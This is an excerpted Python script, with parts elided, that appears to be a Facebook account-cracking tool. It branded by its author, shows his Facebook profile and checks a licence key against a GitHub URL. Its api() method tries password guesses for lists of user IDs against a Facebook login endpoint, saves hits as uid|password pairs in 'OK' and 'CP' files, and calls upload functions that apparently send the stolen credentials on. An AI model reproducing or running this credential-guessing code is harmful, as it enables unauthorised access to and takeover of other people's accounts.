...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/moraslin.txt"])
	exit(" [*] FACEBOOK : MOHAMMAD  AYAAN ")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🌿 MOHAMMED AYAAN")
	subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100095730544852&mibextid=ZbWKwL"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/moraslin.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : Ayaan 
...
\033[1;90m══════════════════════════════════════════════════
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: ayaan): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Ayaan_OLD] : %s/%s -> \033[0;92m [DuDe-OK:%s ]- \033[0;91m[DUDE-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[DuDe-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [FAIJUL-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[AYAAN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [AYAAN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
